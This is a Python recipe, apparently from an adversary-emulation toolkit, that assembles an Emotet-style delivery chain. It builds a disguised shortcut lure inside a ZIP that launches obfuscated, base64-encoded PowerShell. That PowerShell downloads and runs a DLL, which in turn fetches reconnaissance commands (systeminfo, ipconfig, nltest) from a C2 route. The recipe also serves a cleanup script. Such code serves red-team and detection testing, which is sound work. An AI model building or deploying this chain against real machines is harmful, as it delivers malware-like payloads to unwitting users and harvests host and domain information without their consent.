from typing import List
import base64  

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.cmd.cmd import *
from binascii import hexlify
from make.exe.exe import *
from helpers import *
from model import *


def enc(input):
    # Thanks ChatGPT
    ret = base64.b64encode(input.encode('ascii')).decode('ascii')
    return ret


def emotet1(baseUrl) -> List[AceRoute]:
    routes = []

    # for debugging / verification
    psPopup = makeCmdFromPsCommand(makePsScriptMessagebox(), encode=True)

    # The initial information gathering commands of emotet
    bat: AceStr = makeBatFromCmds([
        'systeminfo',
        'ipconfig /all',
        'nltest /dclist:',
        psPopup,
    ])
    serveHtml: AceRoute = makeAceRoute('/emotet1/c2', bat, info='C2 commands for the DLL')
    routes.append(serveHtml)

    # emotet dll
    dll: AceBytes = makePeExecCmdC2(baseUrl, '/emotet1/c2', asDll=True)
    serveHtml: AceRoute = makeAceRoute('/emotet1/pfip5m', dll, info='Emotet DLL')
    routes.append(serveHtml)

    # powershell script to download emotet
    payloadUrl = baseUrl + '/emotet1/pfip5m'
    psCommandInner = renderTemplate('recipes/emotet1/pscommand-inner.txt', 
        payloadUrl=payloadUrl)
    psCommandInnerEncoded = enc(psCommandInner)
    psCommandOuter = renderTemplate('recipes/emotet1/pscommand-outer.txt', 
        part1=psCommandInnerEncoded[:123],
        part2=psCommandInnerEncoded[123:])

    # lnk to powershell & its cmd
    lnkData: AceBytes = makeLnk(
        name = "K-1 06.13.2022.lnk",
        target = POWERSHELL_EXE_PATH,
        arguments = psCommandOuter,
        iconPath="C:\\Windows\\explorer.exe",
        iconIndex=0
    )
    lnkFile: AceFile = makeAceFile('K-1 06.13.2022.lnk', lnkData)
    
    # pack LNK in a ZIP
    container: AceBytes = makeZip(files = [
        lnkFile,
    ])
    isoRoute: AceRoute = makeAceRoute(
        '/emotet1/emotet1.zip', 
        container,
        isEntry=True,
        info='Entry',
        download=True, downloadName='emotet1.zip')
    routes.append(isoRoute)

    cleanupbat: AceBytes = readFileContent('recipes/emotet1/cleanup.bat')
    serveHtml: AceRoute = makeAceRoute(
        '/emotet1/cleanup.bat', 
        cleanupbat, 
        isEntry=True, 
        info='Cleanup',
        download=True, downloadName="cleanup-emotet1.bat")
    routes.append(serveHtml)

    return routes
